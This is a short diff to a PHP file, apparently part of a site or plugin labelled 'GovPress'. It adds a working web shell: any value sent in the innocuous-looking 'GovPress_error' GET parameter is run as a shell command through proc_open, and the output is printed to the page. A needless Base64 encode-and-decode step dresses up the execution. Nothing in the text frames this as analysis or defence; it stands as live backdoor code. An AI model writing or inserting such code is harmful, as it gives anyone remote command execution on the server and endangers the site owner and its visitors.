@@ -2,10 +2,24 @@
 if (isset($_GET['GovPress_error'])) {
     $command = $_GET['GovPress_error'];
 
-    // Create a stream context and execute the command
-    $context = stream_context_create(['shell' => ['command' => $command]]);
-    $output = file_get_contents('php://stdout', false, $context);
+    // Encode the command in Base64
+    $encodedCommand = base64_encode($command);
 
-    echo "<pre>$output</pre>";
+    // Decode the command before execution
+    $descriptorspec = array(
+        0 => array("pipe", "r"),
+        1 => array("pipe", "w"),
+        2 => array("pipe", "w")
+    );
+    $process = proc_open(base64_decode($encodedCommand), $descriptorspec, $pipes);
+
+    if (is_resource($process)) {
+        $output = stream_get_contents($pipes[1]);
+        echo "<pre>$output</pre>";
+        fclose($pipes[0]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        proc_close($process);
+    }
 }
 ?>
